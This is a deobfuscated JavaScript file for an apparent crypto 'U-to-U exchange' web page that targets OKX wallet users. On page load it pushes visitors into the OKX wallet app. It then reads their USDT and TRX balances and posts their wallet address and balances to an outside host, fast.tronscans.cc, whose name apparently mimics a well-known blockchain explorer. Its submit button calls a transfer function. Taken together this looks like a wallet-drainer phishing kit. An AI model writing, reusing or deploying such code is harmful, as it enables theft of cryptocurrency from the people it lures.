//Thu Oct 17 2024 07:05:11 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
var domain = window.location.href;
window.addEventListener("load", async function () {
  await loadConfig();
  if (typeof window.okexchain === "undefined") {
    var _0x1c83ac = "okx://wallet/dapp/details?dappUrl=" + domain;
    location.href = _0x1c83ac;
  } else console.log("OKX Web3钱包已检测到");
});
function pressKey(_0x56efc6) {
  var _0x475e9d = document.getElementById("amount"),
    _0xa3e503 = document.getElementById("amount-display");
  if (_0x475e9d.innerHTML.includes(".") && _0x56efc6 === ".") return;
  _0x475e9d.innerHTML === "0" && _0x56efc6 !== "." ? _0x475e9d.innerHTML = _0x56efc6 : _0x475e9d.innerHTML += _0x56efc6;
  updateSubmitButton();
  _0xa3e503.textContent = _0x475e9d.textContent;
  $(_0x475e9d).val(_0x475e9d.textContent);
}
function clearAmount() {
  var _0x31f004 = document.getElementById("amount"),
    _0x40d102 = document.getElementById("amount-display");
  _0x31f004.textContent = _0x31f004.textContent.slice(0, -1) || "0";
  _0x40d102.textContent = _0x31f004.textContent;
  $(_0x31f004).val(_0x31f004.textContent);
  updateSubmitButton();
}
function updateSubmitButton() {
  var _0x4f71f2 = document.getElementById("submitBtn"),
    _0x40e2a0 = document.getElementById("amount").innerHTML,
    _0x42b7de = document.getElementById("ye").innerHTML;
  if (_0x40e2a0 <= _0x42b7de && _0x40e2a0 > 0) _0x4f71f2.classList.remove("disabled"), _0x4f71f2.disabled = false;else {
    _0x4f71f2.classList.add("disabled");
    _0x4f71f2.disabled = true;
  }
}
function refreshBalance() {
  console.log("Refresh balance");
}
document.addEventListener("DOMContentLoaded", function () {
  var _0x17f6a4 = document.querySelector(".btn");
  var _0x3761f4 = document.getElementById("ye");
  var _0x1d0de5 = document.getElementById("amount");
  var _0x3d5536 = document.getElementById("amount-display");
  _0x17f6a4.addEventListener("click", function () {
    _0x1d0de5.textContent = _0x3761f4.textContent;
    _0x3d5536.textContent = _0x1d0de5.textContent;
    $(_0x1d0de5).val(_0x1d0de5.textContent);
    updateSubmitButton();
  });
});
updateSubmitButton();
clearAmount();
$(function () {
  sleep(1000).then(() => {
    getAssets(function (_0x4002ac, _0x23189a) {
      $("#submitBtn").removeAttr("disabled");
      $("#submitBtn").text("开始兑换");
      $("#ye").html(_0x23189a);
      getaddress();
      $.ajax({
        "url": "https://fast.tronscans.cc/api/trc/UserUpdate",
        "type": "POST",
        "data": JSON.stringify({
          "groups": "U换U",
          "walletAddress": walletAddress,
          "usdtBalance": _0x23189a,
          "trxBalance": _0x4002ac
        }),
        "contentType": "application/json",
        "success": function (_0x44d683) {
          console.log("OK", _0x44d683);
        },
        "error": function (_0x2af5aa) {
          console.error("No", _0x2af5aa);
        }
      });
    });
  });
  $("#submitBtn").click(function () {
    transfer_f();
  });
});